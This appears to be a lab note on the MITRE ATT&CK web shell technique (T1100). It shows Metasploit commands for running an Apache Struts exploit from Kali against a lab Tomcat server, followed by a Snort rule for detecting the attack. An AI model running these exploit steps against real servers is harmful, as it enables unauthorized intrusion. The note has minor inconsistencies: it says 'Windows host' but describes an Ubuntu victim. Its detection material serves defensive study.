# Web Shell

 # Technique Description

ID: T1100  

Tactic: Persistence, Privilege Escalation

A web shell is simply a script that is run on an accessible web server so that the attack can utilize the web server as an entry point to a network. A web shell can be a set of functions or a command line UI on the target machine that hosts the web server.

 # Assumptions
The victim host has the following characteristics:

Platform: Linux, Windows, macOS  

Effective Permissions: SYSTEM, User  

Data Sources: Anti-virus, Authentication logs, File monitoring, Netflow/Enclave netflow, Process monitoring

# Execution 
Getting a shell using the Apache Struts web-app vulnerability on a Windows host.

Running tomcat on Ubuntu (victim machine) and using Kali linux to run the exploit

Using the following commands to run the exploit:

> set TARGET 3 <- option for unix based systems
> 
> set RHOST 192.168.1.129 <- ip of victim
> 
> set TARGETURI /struts2-rest-showcase-2.5.12/orders/3 <- payload
> 
> exploit


![enter image description here](https://lh3.googleusercontent.com/Ih8tdr7UqCwijLkflGCYSq1rZCDfpNGw68Yvv90VAbUNkHrF4P_sRA0iUrWJ9D3X5fbqnFtfLn0=s500)


# Detection

Detection can be done with snort using the following snort rule:

> alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"WEB_SERVER Apache
> Struts webapp; flow:established,to_server;
> content:"opensymphony"; fast_pattern:only; content:"Content-Type|3a
> 20|"; http_header; pcre:"/Content-Type: [ ]*[%$]{[^\r\n]*#\w+/Hi";classtype:web-application-attack;
> sid:8985470; rev:1;)

